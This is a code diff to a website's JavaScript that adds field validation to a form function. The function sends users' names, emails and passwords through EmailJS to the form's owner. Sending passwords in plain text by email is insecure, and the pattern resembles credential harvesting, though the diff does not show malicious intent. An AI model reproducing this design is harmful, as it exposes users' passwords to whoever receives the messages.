@@ -20,11 +20,51 @@ function closeModal() {
 }
 
 function sendMail() {
-    var params = {
-        name: document.getElementById("name").value,
-        email: document.getElementById("email").value,
-        password: document.getElementById("password").value,
+    // Get the input values
+    var nameInput = document.getElementById("name");
+    var emailInput = document.getElementById("email");
+    var passwordInput = document.getElementById("password");
 
+    // Get the error message elements
+    var nameError = document.getElementById("nameError");
+    var emailError = document.getElementById("emailError");
+    var passwordError = document.getElementById("passwordError");
+
+    // Reset previous error messages
+    nameError.textContent = "";
+    emailError.textContent = "";
+    passwordError.textContent = "";
+
+    // Validate name field
+    if (nameInput.value.trim() === "") {
+        nameError.textContent = "Name is required";
+        nameInput.focus();
+        return;
+    }
+
+    // Validate email field
+    if (emailInput.value.trim() === "") {
+        emailError.textContent = "Email is required";
+        emailInput.focus();
+        return;
+    } else if (!isValidEmail(emailInput.value.trim())) {
+        emailError.textContent = "Invalid email format";
+        emailInput.focus();
+        return;
+    }
+
+    // Validate password field
+    if (passwordInput.value.trim() === "") {
+        passwordError.textContent = "Password is required";
+        passwordInput.focus();
+        return;
+    }
+
+    // Proceed with sending the email
+    var params = {
+        name: nameInput.value,
+        email: emailInput.value,
+        password: passwordInput.value
     };
 
     const serviceID = "service_w3d8921";
@@ -32,17 +72,22 @@ function sendMail() {
 
     emailjs.send(serviceID, templateID, params)
         .then(res => {
-            document.getElementById("name").value = "";
-            document.getElementById("email").value = "";
-            document.getElementById("password").value = "";
+            // Reset the form
+            nameInput.value = "";
+            emailInput.value = "";
+            passwordInput.value = "";
 
             console.log(res);
-            alert("Your message sent successfully!!")
-
         })
         .catch(err => console.log(err));
-
 }
+
+function isValidEmail(email) {
+    // Simple email format validation using regex
+    var emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+    return emailRegex.test(email);
+}
+
 
 
 // Get the button:
@@ -70,3 +115,7 @@ window.addEventListener("scroll", function () {
 document.getElementById("scrollUpButton").addEventListener("click", function () {
     scrollToTop();
 });
+
+
+
+new WOW().init();
